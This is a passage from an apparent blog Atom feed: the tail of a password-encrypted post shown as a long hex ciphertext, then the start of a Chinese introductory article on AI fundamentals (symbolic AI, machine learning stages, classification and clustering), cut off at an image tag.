4711780a4e5a473f2f63a500baae847c010532afdd08e1bc3fb2dc33e214c9d230ba548ed1c2db7ef10bf5e4cf3451871f9194025797162e49e07bcbfab97a1774a1a56db4baad611b7bbe755a83cbb6bd78ec074ce748805a07510af23a7f6ac5bf54527abc86f17c25ffa1f3e59edeb61b6b3ba02c45d7c6d27aad417e0cb15d9cc303eaedbee703e639ba7cd3439250c26e1e59dfe1a47da520ee115761365d9f98cdfab05126c02444cefb26809c71e4dd391fc0d6e5f8659f47c4d65952fec1027e4661fbddc7ea34047bf141eb2b15d10556f0a69fbd2919bdeb3ac68d668986a1b9ee56f5ee62d55ef883fe31260880aba18c4b0e19c3f814385ef95b4b724b48e1d9bc16ff4a4becb78947eceb13a092c77b957c29af4cf597fabdac1a48294ed055ddd17a4f3daf3bb9d6f7f439910f43426e806720ecf7ce2e5c1dcbab5bb20e124d3957cbc8cd7de8707f0376e2a3620621a65fa36461d3a52aa053c33658de07e9e941208b28cf1906523d93d39ed616c7fdce4c80ed40fc17c12a459b81b6738275c24913cca215e44107b79690dbc2f89d3c4547b3edd5644e9ccca551f95e49ebb1abf0fddc2b29ca7efab00ebb03e71be8b20f1f9fae7bdcb532d2c4fefdb544dd637ad0ebba332ee3f96dd65b17a81d9b4e0bba8df80a2eda798261213358b3d384442734cd25c9f4ce06141c89b256ecb3604257ac9b8fcc8c60d7825e5873dc4c15c135dddaa76e59f4b07da0de2f95bd7cf988ec7b567cc8eda45255cd7fbdf838dd02908f9c79eabec6a2b06822312a22bf3b36cd7da3d05b7ceb418951179fa21bc435bccefb6c0b98914db055ddd312c46a16ac24ee7fb0f57a1ccb694790b5d2bdc98bfa034e58a13b57a3af7be8f6cdb8c8e335d99dbec5a5cc335bcd906eedfbd98adc4cf6b890cdd9d03c851d522c0d54d88f55898196b3b20b9faadd250e3b8b97fd6d41ab10a6626564e6486c251447faeebcbb79ebda59972b5f5df9cfc3ca54f36b64cd1d04d18922073e86f6199f6a5993ebf5f0a06680f5ed03274e96ad86787029be3fa60246f83b995e3cb055bfd12336cc5bde78427fddcbf95b507e0cda7afbd548d7815e59d3bee7765a4668d2929d4d72f26bb935bfc71a6fac2d306195d612bd7972ddfcceb21b2ec18eaed5c56ea4b45c9087a7775c039892bf2f827d0953154aeb6e669ba4348db81c5ce971de302e985d046cfe66903844be2290a736305a618dfb8f349c1e8a9596c5079cb4018aecde9c5a5348e8ec05250658a21f91d67b1cbfc586b15b9861b2fcba2b84dd11e443977a4c77d99576a8be0e57ddd28bc8f9b1ea77265ef9d45f3992a73bd92e29f65209a4698198673436ab288ee1d03bf5a072c949ee9cf023a15bc12fa187ad459c5a7521f044d89d887529e8b5e8ac2ff5bbc40d913b5da8583d3e8b38196b4b9add6fc2ea51ad584b75bdbeb0be9b12f9f539d01ce48b821054cb540faf312d4999db97438c6bb956037923765ab39f7df61186febf89d472ad6f2505e392459fa7b5f59d82e9b515272591e743dedb0867519663b872e7b56636a2df1f26bd8c8ad997a802e257fe1c50ae6e944b6e192cbb9d592cf57e890380bd071b2407ce2e471a74705c344396b12bba7c57856b4cb92f1b0d83fc95b3bf25207f071f825b33b8c9e7cf06d3a2e9da6615fc1b2160b31f61ab0e1a72cc812829ac75ef8b11b70040be1cdad6ecb802867eb50a14dccac68813f1f62b7be59bc40e5ff2f99cf1b1d1db15235cca30edca09b286d1662d9cd37c687f203285306919c4f831986312de515ea73315895d6b854b453d7417c991de06a8ff4b892f4ec18ba7caa3de9d6a311151079828fab974e3d426f72d273935f6ca43155705e834524c58fb03698c3f3cc81e35d8095bae99494b50e6f256069c7f2073afffd1d748f8b462de2964cd3c15e48dc5481e679cacb2fde52c49cf1a8e7ae9a209f3a535eb44b03689523bd1edf3fbcb9469d30b47ba623b126c26a012336ee013cba3ba9ed2fba88f04d51b80f957527fd724a331956b67cdd1aca07010065e4af62a247623fccb136b499cfae31cb0c5f1017e8901f4148fc42e6e57c20fd8fcc07b02f06281a3e72a11d0420b08ae2d5d720596228c0b3bd0cd509ff09d8bd082d8d7f4e3cfc0d9c734a17a0bb373ff863c26ec43f40c7648af13e35dffc7cad057b2fcd61584aefbdd605a19a39bb85ed48426ae5a5c101da4fa6b248c6bbc7e5ba2eb450cb653cbec05829fe2dcc66da673aeb03008a91b554d3f4953ff583f7af02720acffc7a4d9d0620b33e4360777674142f895d7b89d3912a5b891f37f178792462ff9bbb89ff37e6840b6df8d889fbfe37514d2fd3afc3da5a6992419f566a244cb83c6d122fe73d1f66266cd2130671f8af3f46e2c23d4d5babe33c0820f4e6818073bb791c882659f60d4b3fb494afed547473ad81e4f5d606a0b7d14b55f0c27c023ae2bf18d5b5954ae3aba30e484697dbbda184e1b23f87f8d2e899e7287f5e9b7470da0754d62c5b9b1eb90c7696c43cde33a146a65af20350657920b4e7439f9429a718784fb4ebcb4a80ab25763535a5503d3df6ec7be4c35357fb01f4cca620e5bba61c28249101682f0236657e8f56f4d277d95208c42c02c5531bb09072555187c4222c4ed570fd9a756d3d312012e07d886c35fd7441bd8b036fa565008f8c378d8a826f0a8827a2dedf1536f3787e5a18870a6679a2997776fb94d3ade61f7456a734b72d210942bd39ba9bb13ad1812304f13d6911d107671251010d55a721fc55124067118b5193eace329330bb2a3dd24d33198fa1084d89002e02035908aa05d539f946a3b7f06dc1810f20d1c7a85c004363fb1864f7812f07976f2202f1353b3e0279c76e5fce069747b9e3773e51cb5743def34324a5c6131ceb3f490910968637479976db5e4feda1efcfda08573dfb9030c71927e6966dc547541abfd8602bb2bf71383edb21711a9be0f99fd984b8bff87225b8bf922a65954fed846fc85d3d6f28dbfe6e57147e2c99bf79be11c6a3d085c76b281c8428e228435beb0c0e5b918c2eb32ad616269d592ed675491424d649c756855a45702e30d9c306268ade66ed84af578a020938ea1291f9857420d170882ae8c7294767baff4238bdafcc2fd5b8b179ac19d793c71ce8a2f78c5ceed3c43cbf26157ef430aa8aff27b6c5cbff5f2f522c58aacc44cdd7651fa5ede20e53e4532eaf6d69c0a02fd06c3ee0f1151ed3eb6b02fc7f9994911f2b23ad1ecf30e26fd131884916398c1ab8886981bdae314af86055545003187f8523bd6f8c484629c006269ff30bea877017f3f28e09a694bcdba1552e7c5316e8e69d9d8ac9c64052708ebf01c092bc75599a0b634b009a82f60c97d17a5b332b8dfc35b264be9e6e6b3697024ca02ef9a0d937303d6b4f1b8ae640c37ef55f72f3195a6fe6d49206c3a81377f8ced0be9f1b266164fb5992e882f65971b413c841f945fd51b8700e2fe044ff382f18870962a5a2276f6a5a5093debbd43f840456aec656a8fdd1304c9b9e0ba5ff33ad319e6163e7a493478079c06ccdd449649a2c07e11586418b451cdbed28e2caff0c9f8e48aa69bdf45bf0919f36fdc3d29cc97cd0263cff4174e7cdaec5e6b66376dee5aa20a0488118d7679418a845f31c036163ae503ddfbda76f13e4b3dd865784fb23030ba8d7dfd7c6fb361d12ef3429a0c26bf48271736f8193b9216ba240f5d6d6f237528d1da729c52e03ace90879d2559a58b6cff05068e2dd396bfe35ac1e54740e2bdc78a41b5326d0822fe82d7b05c5e97e374cb36f693611c522b404ff677e8e36e62894f05f366f76b029b4a36cfebaf77dd76caa3975d5dc85d085fa7a38da556de016ea5af9dd8cd1e33adcf2e6fb4dde8b37d5dabefab06d680fd5dc577dda82705446cbcc77772db15f38ec54161863482249792c3ce9949ef38af3dfb0ddaad8ba41927844f90de067312c93d137dbf8325d245c7b8d94b2ed0d9fe428b9e0b5515e8fd7e530c99c7ef449223d85f55e0692f6867b4f014c001d292bee46529c3e35b7db184bad6452cd367e189520cbbe5390fd676226395257c5a1c04364550315c4a35f2995ff6a4d9c1795613456c652a0cb78a0a6f1c1080fca3912b016fd9dcd0c8c02daa2c064d8ee4d8a08bc6b7f191556f55712679711a40c8723e9280a7f954892b5138f9a81096341f5642b28c410cdfac7107291a28bc3bf7758cab733e361dff5f41abaa6a093cdc72e4d35ec80630e2587e4e810aab6810c8c3054adfaa1a0504db91aefccb9720a4264783111613a4d643c905f53d28b77ca9d26dece7a65b005036add250d03cf42030024c6eddcb7ec4e61c5515e2e5e6446fde10e273331e66d26ef65780294a32179cbe733bfdac4742ee17a841f45af53bf0738f093c4ee5844ddc356723174be0ca6c794ede6f82e2e330666288e8061209df9963b0b3afc92f4ab9a5e2cf7b978fbf1d053dbb6c118a80fafe6d237d0109d74790839d201e7dfe77b15c12488940ac0c17c1669c04694656fc696993edfd6e71ce271707dfed2a8a8a214b477cc7c8f5f2ed91976b2af0007959c0c9d7c56c1057f430916870f650da82c0f445401e5d311520086552922a7aefafee9775a9892a93a94f90b35e662324aaf8159c8b16f6a2d57c66ee373b7b3105d73957b5c5d8c613b7e957c65f8e33625e6c8d62f83485a306f61ecd8e864bcd021a3d618604fefbb32ff787e697cff304c88f58d72387343dbb7d960b47e517014b380ca2456eff4c4f428b1c7005937b212fe00a8332d66e68f7962114d7595a0f9d9cb1128a833006ba2490a70cb79e390bf51ca7746aba7f220335cb6124cac9a36a0ba599f091dee656e7b94b22e5771d9e685591778771e97e4d828a076f4c898475b1aed1479b46816ff79c2abb523872c6310d0e9be81ffd34abe4b60be5370e1a7098d881a91e0a986b147ac2ee6b7169ae7c824daadbbff8298d50d932562ea1e8e17caa30285174e3150eabcad15f51b4c5d7d3e5251e7cf7bf06fb81b77f753448ce6b8659e293dac7d994231a6ca3a1d54f9c94068f08b197005c94da44ca130396e1b7b91441c25c3f676c2af4a477bfd685ac0ed093ec49659f51783cf7a1243a4b33aa448d7ee034923f922141ed1efacf382847adfdb5f06419f11b50931ea6a070b4244394b3a28baadf658ed6ca71028218ba057edabcfa9f4cd40e1d2f63ba362721bcda54ce92ff454de7a75d0ffed0427c230ddf31849409ee22a4f6a8d6ecb8928aba899eb28a607e9febae7ba9a2b9cb3f7fa5d1ed91a23e79c8c99ed371c116fbc1887da6391ec4a71cbb69a89542cb51b6a87cac21b9ddc4fdde9626bdba2eee27b5ad9b35785e3e0f0d96fe845811be2c2b220387eb3de0deb7088551cd5ee1673d6b0bbed0fd5daeb72c7b8fcb8b4524b0e309865124e7214162c9eca008e8b93095489f6231dd3dd173500d9eae7c74e495a48a6fdb9272f50dd42f2630432f9b5a4295aefb959fe69fb2f2d54e18f09726815664911b553deb44b015e34a2ed3ebdb18bca17ce5ab9c53580b9979d52a5585f677b64a3f82a423da421ae3ccd2206462202fcb647b1f29ba58a6191eb5ad9046208eb7b0b3b6ebf6d2567383815e7fc2d9ee0389204333f1d518febb9f7cb8dc69452b9398353e632d7cca12d02440f67bca1aacfb621e3438e16ca89ac9f416f22821c1536205ce706cc6f6e2add5998e9b919ad423e7ec62a7c80b0857e2855c8ace1e20f17509d60f7a7f5d5d2b73907b9d7f8ab99dd27da81e5c67e572c65913aac56e1ea04f873e72a9392092eeae6ad273013a41a12b576d87118731308000a333925642235e083b7b15db2b7b6b2f482bb263d8bd43dd872dec910af3490fd3c880e9e1a4af83d1d6c6ae4ab3bb3383bbb7f534c6ba4e3a5e8dbea51e1cbf4baa9313c2ef49094f2fd62edaf192493b84ef7837efbb961b39db79bcb3f128696792abbe76001b25fad61403be79e5df891f2cf6155faaf6b19ec7ba885da2fc9663e38f05e86423b46a6dd41356f98cb3763f7c7cea18ff9329d6e4a9183a92ed54ca1ab59cd6efb2cad02e2445b83b7abb0694d8400ff91a5207ed19e91e3d7ff74aca4e16edcae480b6bf4365688651a76d3d8fa59d59837c87ed69c69a67fc0910c94d6fbee94e17660e88dd7e9040e2ddb864db428065f786c95400db543d6b424db06c8311c0520880b87e4c8f2add96a6e435b75d4566ee626109ee9bf1972565acdca245988ea62620012876b38c785c33e2cbdf6aee096200e67d50e71d14b2da5f741634b877f41012dc4a71ad74ccf293ee004b77f1df6ea07dc1bae0a707cbff19a5e14b567613f27b0c2975d04abdf5c069fff2d27729bf2bd90cc811ab6564cb207cec96b2dc9144f50fde65897282f7c7c3f6b61d4c95ac8fdcf9c1574e15df2a994f63878faf658919ce884feb34b2399a79bc0941b9b9b53ad7f0ea9af840b248ee1bad2ef09f16743a588c611b1331e0032d68b7674328a5c2bfbcbe3cf68d246836a99af09177f380556fb4c6424963ca98d86ba8cab8bd488368a24a4c4124f971abe2dcb743a7b9a0ce66e4314eaec687c022a636767adb42961cf350c82bd30f7969f2efa32a5cf353f37e47a34b98b6e4f892a41d2ab282e9c84f5b7834ef705924f85b05578636a134d2debdcf8bb2247d5bf6815f415631840062a633ecc58a73c7de32cf49767508c298bbaad9a9513058dddc613c46fa762c30810ef820df3d4265f8707876cd8edb14f9a8f0a51376a9f5659f77f9be4a4019a3a350b6783f66a29cc0dba777936b1dce591ecee40b5474b238e73fc7fbe7709f3c4af0ddad13ba520365ecb63274c7c3f3976c39d3025e73a7121eac9461a65bd9b144c1aaf1174bf1e770519b291511a072ade2a72853d312e324d83bc5f5d35cec827725fb80bd74e980905289cca426deb194328e4b12be862a016e4062d88e922a50ecbc1de287d3f555259d9db1532b1d2ee71a945520b87e745c5245a194e7f16fa5654e04fe11f9a35f0a5998cd535248ec955677cdbe35ce219740dd8802f579f454bac6a3ca4fee953cd47b6ec23d2b97a646fd2bbc9240871956ac226ab399a32ff8ca76bb4904a6d053d740d7b3d42bd2e25ac53bb8ec34ac7aa2831ec03d1f2a8b88b6d26a53546798ae28f02ed0e19ffc26e55be30944bc112703ec731bba5de20d2ea28791c902d132db28881d0470c4875074f05736dc46db63b4b51fadc98f825b7dafddbffe0514710d17f8c08449178038c37992033aa5fd1854f810cd0d6f64ad98d6d5517d20e934732c21f2065efe01213f4235f6c0e29f1abb7b160fdcf6f5e74a126f6cf288e3cafdb08c7c876a84e54821882142396119f368a695a38dbb0dc060cb152b89270fb861792279b942265d0809ddef064ab6b0e907a3dfc5de383ad215e3a9c962996e775997e2f002c876bc8e50fb6de4a43f98de9a4fa7fe0e21f6ffd5e4b888bfc347a2178494fb7713deddd480d79412cda83238f7becada7ab255fc6b3236386d1ea961ca394d2e98d95751cacd251b498b05282a44a2cc752b9a5edecafc8e3b8938288731e7c7edb1a13abe8db19c7b62ab6889813a8219a2afc470c0c178161f7951c22801611a731cdceda1d937893d0b406718f1c26c8d420f9141552e06ba9f204f53495860404e4749063f0be23b5a72496cd32bc7ab8d4f4dd8333ae9eef014ead6b51dd63d60d29720f6ad10f88c9b0ed501b310fb9d1651d90ae0280ba9644fd7207d8de2c3fe4c8bf445f71542c214a844004d11b2448531b2433dc9c73293d6a7c4c2d050006f5f348e6d8bb7c718162a0fb9e6401d0358d9a7c7c433b9628061f8b8c5216811d8e2c63c30c4f84e1234cfa0a06d9911e08c17bbb74855ee4bb84e037182136e38e3b2d0935d3c9246249f6531d0c1bf97a086bc22fa8346a78ab7c5a85988fc99274b1e3e762b58b0f53ea2a1bb73cf1a2d1ea7e40ece691aae98d67f2037446a5abff774ec37ac35973c6c2a4a89c557ef583d93aba58b5038625ce47dcb426de8deb7555c41e4e4b3d162feba2fbf51e7570dceee7ef7017c38d7909fbdef98b15a5e931dfcdf8731bd2785d5e4c32477c78be152d798807bac229a34c4a173b43e21d1ab7c2b81708d0eb5835860b76488c0a8344e3f52e6e6b215b620197c723d492ec5e43ac0b9f631bb3e3b5bda8c385dc8394420a7f3182325df76553fe0b07f4cdefe38733316e9ef627248dac05fba58316209234146e04b2ec71dda751010fcf2f22d176da024f7cd133b881c19edcdb0f6bdfaed78bec3ddb73d5f11aa31d13f8963ae7eb95d5cb08cdcc6c01778976e25bada3e33b00d804d3ceb94d2067a9fdb4488065b219501e5f3b31001b265ec57906a3caab4a243f7695754f2cf5a5ac439b45d2b99d4ee2419c7dcbee9e0ab07d41fecdc9fd6ad9ba4f01d2d4e7aaa90921e2588c1bce2e38f07ad1f44102a2266bb92f28d708ef7a5beb7af6b1fc48885d839b7f8af7baadbdb297700849f50d125b4e8af193470b0e277d875931a1ff5a9296ecf337da5dc609782e6ce07956afd3fa6dab3e6fd74b9e868584b25e80835327b9b470b050d66ce3aead0f1ecbb9ba483680470a40829a7b11c4c71ad1a9f9c60fa6298a047c59a30820189c06fc1a4568cc1a8d74df83c0c3eef25d9dfaa97067e0e67ce4d0a84e31668a4b3534d6a484296fd954bbfca4b77f9f49abee64daf467d0ea17d6f9915bf584dffe10e1c66cecc457b8c2d7556588a3710545a7045aa41cc8ea91083b127e34134b13b00bab928a1823ff32d3305a3418bd60bb94bd6b5b2f5b07ca6a9f8916f8e69c82813d9408a9692d243a120f6578c206c88211c83fcf5dff6455c58a0f7da464036825ed30baf4ff4be41bfe0e5ebd96f2b1dcaf0526f6946366d80e9f3105432612528291b92ae6fba5950ce1462e2ff99575cc24aead8da11bc6f93679b2279dfe29af0691f36e3196dc4e8438e86accb1596a0fecd48e11496090bfba034c5bc718f6830af4525bfb51e60478547e3b90b5198fa3f6ab326cf881ec3ed4a3fd100d4cc028e4402984501f701f869993a2a06ce09827f911ace2bd7763e0233e731d2c0a055c8278ef2262605c24967cebc98ce0bd36b5a1b5ec14addd954c37eeebefa62f9dcb645683566203dbcf4ed167e51085981b93db95ddaf0958a9a1d85e3f7109e401a03b6b75462411f0e3d0be68112d9a5cb54f8f0c5c16fa23db0c2573c2c535c01be3837be59013ab78d7ba645e89525d513f13228f26b806fc9039d445ba2c729f6d2e93da81b853c638a7640e5991aef0ec8362b72545530f99b03897eec169496ff7dc60899c20e01f38fd6aa6b60bc37821f216e394c41f02439ef74845e7b735a666f5ea929a1aa0b24d4f7015b96c5e610587a257e758da19e522adbcff5416313735c79ec84c7b5ac40e0cfceccc3f9131a2a879c9b290c550cab9789e370d302c8e71ac2e642b6f3c5a607b371bdf114f07466422871e5d5c3bc3fbb3f80964f228736862cac52e980ffadfc03077cfc74ed6535039aaf7b2eb939b12ec6dace6dd1019f5ea0fd1aacda2ef0ec171b1080be3bdedb15e7a34c1c672c2f8e20d5d5f81ba7ba5528a8cbd8a3a1b986b0172096dcf59c3894a2af902b09188bb56e1d08577e9269a4d5028a37a976ccaa4fe3e141c356de3f3b8b9a051f0eef9f0586a82ef8daeb2cb71564a93fe2acb8ed9a147868dd18426282a562943fc2245230ac965ee4923cdfb52e09cfcd5b8f346474baca29b04564b4bf8cfeeb8d231008ea31f917bce6a440c37497f36cf61b1fffeec6f73810d7354e36c3d5e5daf61194aa4251fd9e514fbeb197fb6ad23050d0178bae3ec9599b70d270a75c6704c81f25a40f80a6049b30b4f2c89a29b5e34152757e89bfd16c168633fdfaba05cbe455190a326f7b5fe85a6853666db098a9d18bc171608e393fa4054ff97198220b857f8af5321cb4d95fcae3e6e3c617750d78541f00bd41904af2f5b29aaf2a91e605c1324e3c3b5e75dca3f02d728d8b896427e59ee31638158699160dabd8acb1c9a2f9c7d747246b162e6ca52ed7414a7f2b4c41cb24f455e5f1e9ff33a5b51e109c5e9d3b2e6c4ecded37bd1c954bd2cc05729d38b82ebb07011b215aa939d2e41812fb7e076692cf20504e960c283edbb7e92a630c07d18fcc22c55bbdb7593680edcb0e0a6c783d9842a987e64e87534a5ecd25906f22dc2c09c898cebeb4e3c4132f7eb1af4a14879c15af2474172014c77413f2a13a5ee0440cb52f265eeaa09dd0f0fdc47738708fa0563bd24f31db1d884e6a1d25b6530963d48e44d2ae760e0cc8f820029c69408cf1bf702178380a9fc4a5a6b04649d7092900509b8037cfca3760051207dcaf2625bf4c1a85d21b0bd1a9dcf053c38edcc1a016247624506fb876be663e19805104ee9dca8094772fff38d2b9431f11f8584c936707098fd4c9bbf5b0485d5195cb74782703657c89d7f82ff4e36955efac342c7e938483d3a65e13e9db2390cae9193e5108780636813f3c4a5384382f69bcf20f5b208371d4a4765ca26ce99d96dbcd57602f8231a570567984156c3c480e2ffbade488f071e443e11422950cfa3a5113769aea2ec520d48804fba00e69b3e5fde9c5a6079e10c52ee28d09b17ace9fe5d58467c0dd44871f21272ac050cba51c7a662a43c32d754700ee2f58590bc965e62f823ddb00f36629f5542c3aba9189b3352af0db7cf64c7bf980418068591676a78c52fccbb94deb332f4c3ce26d25d44dbc7748b5e6f9e62977b0b0d3d47972adb79c4b9be72b51c99508a1c5108144ae4170539a21da78ebccba680f22532bb9ea247de5ca91baf8f480b46fe2f440e34ed22956c86894f15297689056aff1064c711a6c665ad20b31787c615255437b12d76e1a3ff0f275a60818b4a3b39de8409ba02ec314bacc039bad1483855fcc1253152e2a183e03b64e2b9f6a1d5e490144b6f609cef6118144f817841387ddf9da</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/Theories/AI/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>SecGPT 基础知识（一）</title>
    <link href="https://coldwave96.github.io/2024/10/08/SecGPT1/"/>
    <id>https://coldwave96.github.io/2024/10/08/SecGPT1/</id>
    <published>2024-10-08T10:58:36.000Z</published>
    <updated>2024-10-08T10:58:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>2023 年科技圈“最靓的仔”非 ChatGPT 莫属，它是大语言模型（Large Language Model，LLM，简称大模型）的一种，而 AI（Artificial Intelligence，人工智能）也再次成为业界热议的话题，并引发了资本领域的狂欢。但若不是专业领域出身的同学，面对机器学习、神经网络、决策式 AI、生成式 AI、大模型、GPT 等一堆概念的时候，很可能搞不清楚它们之间的层次关系，这将不利于对大模型的学习和理解。因此，有必要从宏观上先对 AI 基础知识进行一些介绍。</p><span id="more"></span><h1 id="早期发展：符号人工智能（Symbolic-AI）"><a href="#早期发展：符号人工智能（Symbolic-AI）" class="headerlink" title="早期发展：符号人工智能（Symbolic AI）"></a>早期发展：符号人工智能（Symbolic AI）</h1><p>AI 作为计算机科学的一个分支，大概出现在20世纪50年代，核心目的是让计算机能够像人类一样思考、学习、推理、决策、交流，更好地帮助人类解决复杂的问题，变得更加有用。</p><p>从 50 年代到 80 年代中前期，是 AI 发展的早期阶段，也称为“符号人工智能（Symbolic AI）”。所谓“符号”，可以简单的理解为语句和规则。这个时期计算机的智能性主要依赖于领域专家和程序员将现实生活中的知识转换为规则，然后进行编程实现（比如一条规则可能就对应一组 if…else…的代码），而大量规则则就形成了一个知识库，可用于计算机的推断和决策。因此，“符号人工智能”也被称为“基于规则的人工智能”。</p><p>在 AI 发展的早期阶段，符号人工智能曾经发挥过重要作用，典型代表如 IBM Watson System（医生机器人专家系统）。但随着人工智能的发展，它的局限性也逐渐被人们更深刻的认识到，核心问题在于它非常依赖系统构建者的专业领域知识，需要大量的手工编码来构建和维护复杂的知识库，难以处理那些模糊性的问题。符号人工智能的优点和局限如下表所示：</p><table><thead><tr><th align="left">做的还行</th><th align="left">不太行</th></tr></thead><tbody><tr><td align="left">在人类已知的、广泛的、通用的领域中解决问题、制定决策、满足约束，如领域专家系统、辅助编程系统等</td><td align="left">过于依赖专家经验的转化，复杂的代码开发和维护，边际效应日趋降低</td></tr><tr><td align="left"></td><td align="left">在自然语言处理、语音处理、视觉处理等领域，没有取得明显的效果</td></tr><tr><td align="left"></td><td align="left">系统很难知道经验边界之外的事情，难以做出合理、准确的预测</td></tr><tr><td align="left"></td><td align="left">大部分算法不是分布式的，难以扩展；即使考虑了分布式，也受限于当时的软件、硬件和网络能力</td></tr></tbody></table><p>随着各个业务领域信息技术的快速发展，这种局限性体现得越来越明显，性价比也越来越低，因此符号人工智能获得的研究资金日益减少，社会对 Al 也从狂热的追捧变为冷淡的唏嘘，AI 的发展进入了瓶颈期。不过，符号人工智能作为经典的 AI 技术，通过对人类知识进行规则化的转换，能较好地帮助研究者深入理解人类知识的表示和处理方法，仍然具有学术上的研究价值。</p><p>穷则思变，一种新的方法随即被提出，取代了符号人工智能，并逐渐成为人工智能领域的主流方法，这就是“机器学习”。</p><h1 id="主流方法：机器学习（Machine-Learning）"><a href="#主流方法：机器学习（Machine-Learning）" class="headerlink" title="主流方法：机器学习（Machine Learning）"></a>主流方法：机器学习（Machine Learning）</h1><p>机器学习 （Machine Learning，ML），是人工智能的一个发展分支，出现于上世纪 80 年代中后期，并逐渐成为 AI 领域的主流方法。它的核心思想是让计算机从数据中学习（训练）规律和模式，然后在实际的任务中进行计算、预測、决策、优化，是一种“数据驱动的人工智能”。数提是机器学习的核心要素之一，可以是结构化（如SQL 数据库中的二维表），也可以是非结构化或半结构化（如文本、HTML、XML、语音、图像等）。平时我们常常提到的“神经网络”“深度学习”“有监督““无监督”“卷积网络”“分类”“聚类”“大模型”等诸多概念，其实都属于机器学习这个领域。</p><p>一般可以通过如下的维度来看待机器学习：</p><ul><li>发展阶段的维度：如统计机器学习阶段、神经网络机器学习阶段、大语言模型机器学习阶段等。</li><li>任务目标的维度：如分类、聚类、回归、排名、降维、优化、密度估计等。</li><li>训练方法的维度：如有监督学习、无监督学习、半监督学习、基于人类反馈的强化学习等。</li><li>学习算法的维度：如线性回归、逻辑回归、决策树、K-means 聚类、支持向量机（SVM）、卷积神经网络（CNN）、循环神经网络（RNN）、朴素贝叶斯等。</li><li>模型原理维度：如几何模型、逻辑模型、网络模型、概率模型等。</li></ul><h2 id="发展阶段维度"><a href="#发展阶段维度" class="headerlink" title="发展阶段维度"></a>发展阶段维度</h2><p>机器学习是一个不断发展的过程，每个发展阶段都有其独特的特点和里程碑。虽然发展阶段并没有完全一致的划分原则，但按照“统计机器学习”“神经网络机器学习”和“大语言模型”这三个阶段来划分一般不会引起太大的争议。</p><ul><li>统计机器学习 Statistical Al<ul><li>它是一种基于概率和统计理论的机器学习方法，利用统计学原理，对数据进行分析和建模，用于预测未来趋势和行为。</li><li>应用大量数据来训练模型，通过统计学技术来进行模式识别和预测，如朴素贝叶斯、决策树等，广泛应用于文本分类、图像识别等任务。</li></ul></li><li>神经网络机器学习 Deep Learning<ul><li>它是一种基于人工神经网络的机器学习方法，自 21 世纪初期得到快速发展，Google AlphaGo 将基于神经网络的机器学习推向了高潮。神经网络通过模拟人类的神经系统，从训练数据中抽取特征进行学习和预测，广泛应用于图像分析、语音识别、自然语言处理等各种任务场景中。</li><li>通过构建深层神经网络模型，实现了对复杂的、非线性关系的建模能力，如 CNN、RNN、LSTM 等，在图像识别、语音识别和 NLP 等领域取得显著成果。</li></ul></li><li>大语言模型 LLM&#x2F;GPT<ul><li>它实际上是神经网络的一个发展分支，也是机器学习的最新阶段，自 2020 年左右开始得到快速发展，并因 ChatGPT 而间名于世。当前的主流大模型主要基于 Transformer 架构 （Transformer 是 Google 在 2017 年发表的“Attention is allyou need”论文中提出的一种神经网络架构），一股拥有超大规模的参致，基于超大规模的数据进行训练和学习，在各种类型的自然语言处理任务中（如问答系统、语言翻译、情感分析、命名实体识别等）取得令人惊叹的效果，尤其是文本生成类任务，目前已进一步扩展到音频、图像、视频等领域，被认为是实现通用人工智能（Artificial General Intelligence，AGI）的最可能技术路线。</li><li>基于 Transformer 架构，基于大规模语料进行训练、微调和提示工程，强大的语义理解和生成能力，应用于文本生成、情感识别、机器翻译等各类 NLP 任务。</li></ul></li></ul><p>不过，用“阶段”这个词可能会让人误以为早期阶段的技术已经不再发展，这是一种误解。实际上它们各自仍在发展中，而且都有广泛的应用和前景。在不同领域和任务中，也有着不同的优点和劣势，需要根据具体的问题，以及拥有怎样的数据，来选择合适的方法和技术。</p><h2 id="任务目标维度"><a href="#任务目标维度" class="headerlink" title="任务目标维度"></a>任务目标维度</h2><p>所谓任务目标，就是我们想要利用机器学习去解决什么类型的问题，完成什么类型的任务。问题和任务不同，适用的模型和算法往往也不同，下面以分类、聚类、回归几种任务目标为例来介绍，其他不过多展开了。</p><h3 id="分类和聚类"><a href="#分类和聚类" class="headerlink" title="分类和聚类"></a>分类和聚类</h3><p>“分类”和“聚类”是两个常见的任务类型。</p><ul><li>分类：根掘祥本已知的特征风性，将样本在已有既定的分类规则下进行归类。适用于分类任务的代表算法如逻辑回归、决策树、朴素贝叶斯等。</li><li>聚类：根据样本已知的特征属性，将样本在没有既定的分类规则下进行归类。适用于聚类任务的代表算法如 K-means 等。</li></ul><p>在机器学习和数据科学中，还有几个与分类&#x2F;聚类强相关的基础性概念。</p><ul><li>样本（Sample）：样本是从总体数据中抽取的部分个体数据，是用来训练模型、推断总体特性的一个有限的数据集合，可进一步分为“有标签样本”和“无标签样本”。在数据结构方面，结构化、非结构化、半结构化均有可能。</li><li>特征（Feature）：特征用于描述或表征样本在不同维度上的信息，代表了数据的内在规律，也称为属性，是模型的输入部分。特征的选择对于模型的表现往往有着至关重要的影响。</li><li>标签（Label）：标签是希望模型预测或学习的目标变量，是每个样本的已知结果或类别归属，通常用于有监督学习任务的训练和验证，是模型的输出部分。</li><li>数据集（Dataset）：效据集可以理解为样本的集合，通常由一系列记录组成，每个记录包含若干特征和零个、一个或多个标签。数据集能够进一步细分为训练数据集、验证数据集、测试数据集等。</li></ul><p>模型的训练就是根据已知样本的特征与标签之间的关系构建出一个预测模型；而模型的推理则是使用该预测模型基于来知样本的特征进行标签预测。</p><center>    <img src="/img/SecGPT1/FrCL3XyJcjhf-ZNd5480PglSR9mQ.png" 